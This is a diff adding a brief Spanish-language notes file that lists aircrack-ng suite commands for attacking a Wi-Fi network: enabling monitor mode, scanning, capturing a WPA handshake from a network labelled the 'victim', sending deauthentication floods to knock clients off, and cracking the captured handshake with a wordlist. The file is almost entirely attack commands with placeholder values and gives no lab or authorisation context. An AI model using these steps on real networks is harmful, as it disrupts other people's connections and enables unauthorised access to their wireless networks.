@@ -1,0 +1,32 @@
+verificar la wlan0
+
+airmon-ng start wlan0
+
+
+matar procesos
+
+kill numero del proceso
+
+escanear redes ina
+
+airodump-ng wlan0mon
+
+se procece a capturar el hanshake
+airodump-ng -c canal --bssid mac de la vistima -w direccion para alojar el archivo wlan0mon
+
+
+Se 
+
+aireplay-ng --deauth 10 -a mac de la victima -c mac de la station wlan0mon
+
+
+aireplay-ng -0 0 -a mac de la victima  wlan0mon
+
+
+y debe salir e hand shake
+
+
+despues
+
+aircrack-ng -w (ruta del diccionario) y ruta del archivo arrojado del handshake
+
